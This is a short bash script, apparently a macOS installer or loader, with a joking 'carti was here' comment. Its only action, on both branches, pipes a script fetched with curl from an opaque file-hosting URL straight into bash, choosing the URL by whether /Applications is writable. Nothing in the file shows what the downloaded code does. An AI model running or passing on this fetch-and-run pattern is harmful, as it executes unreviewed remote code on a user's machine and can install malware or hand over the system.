#!/bin/bash
# carti was here yes daddy carti YESSSSSS YESSSSSSSSSSSSSS~

main() {
    clear

    if [ -w "/Applications" ]; then
        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moaP9GDWnAK1LoEG64mIT250kWZUrlHKQzJScpM" | bash
    else
        echo -e "${YELLOW}[!] Local user detected, using home directory instead of global MacOS directory ${NC}"
        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moa9ERAriswI4FHOvNMXhpAcYjJtTGdRyBlziV0" | bash
    fi
}

main
